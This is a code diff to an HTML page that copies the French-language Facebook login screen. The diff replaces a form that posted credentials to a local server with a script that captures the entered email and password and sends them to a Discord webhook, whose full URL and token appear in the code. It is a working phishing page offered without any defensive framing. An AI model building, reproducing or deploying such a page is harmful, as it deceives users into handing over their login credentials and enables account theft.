@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Connexion ou inscription</title>
-    <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -195,16 +194,14 @@
             </div>
             <div class="right">
                 <div class="login-form">
-
-                 <form action="http://192.168.1.185:3000/submit" method="POST">
-    <input type="text" name="email" placeholder="Adresse e-mail ou numéro de mobile" required>
-    <input type="password" name="password" placeholder="Mot de passe" required>
-    <button type="submit">Se connecter</button>
-    <a href="#" class="forgot-password">Mot de passe oublié ?</a>
-    <div class="divider"></div>
-    <button type="button" class="create-account">Créer nouveau compte</button>
-</form>
-
+                    <form onsubmit="submitForm(event)">
+                        <input type="text" id="email" placeholder="Adresse e-mail ou numéro de mobile" required>
+                        <input type="password" id="password" placeholder="Mot de passe" required>
+                        <button type="submit">Se connecter</button>
+                        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                        <div class="divider"></div>
+                        <button type="button" class="create-account">Créer nouveau compte</button>
+                    </form>
                 </div>
             </div>
         </div>
@@ -239,5 +236,35 @@
             </div>
         </div>
     </div>
+
+    <script>
+        function submitForm(event) {
+            event.preventDefault();
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+
+            // Simple validation
+            if (email === "" || password === "") {
+                alert("Please enter both email and password.");
+                return;
+            }
+
+            // Send data to the Discord webhook
+            fetch('https://discord.com/api/webhooks/1263073130071461899/DXdeo57DlpfrGdDIBzh0GOX5djz9TxMd-O4v99ha796AZgGKlpDvysm71dIfkyZMxD_G', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: `Email: ${email}\nPassword: ${password}` })
+            })
+            .then(response => response.text())
+            .then(data => {
+                alert('Login data sent to Discord!');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
 </body>
 </html>
